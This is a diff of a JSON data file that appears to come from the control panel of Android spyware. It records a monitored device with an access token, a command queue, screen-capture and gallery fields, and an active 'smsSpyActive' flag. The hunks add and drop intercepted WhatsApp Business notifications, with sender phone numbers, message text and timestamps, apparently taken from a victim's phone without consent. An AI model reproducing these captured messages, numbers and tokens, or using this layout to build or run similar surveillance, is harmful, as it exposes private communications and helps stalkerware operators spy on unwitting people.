@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775636876434,
+    "lastSeen": 1775636879447,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "🗿",
+        "time": "08/04 15:28",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775636881641
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎2 pesan dari 2 chat",
+        "time": "08/04 15:27",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775636876591
+      },
       {
         "appName": "WA Business",
         "sender": "+62 898-7564-441",
@@ -4310,22 +4326,6 @@
         "time": "08/04 14:34",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775633673133
-      },
-      {
-        "appName": "WA Business",
-        "sender": "𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏: Membalas Anda",
-        "content": "~ sfr: Nama aslinya Kon ol",
-        "time": "08/04 14:34",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633673121
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 898-7564-441",
-        "content": "P",
-        "time": "08/04 14:34",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633673109
       }
     ],
     "galleryPhotos": [],
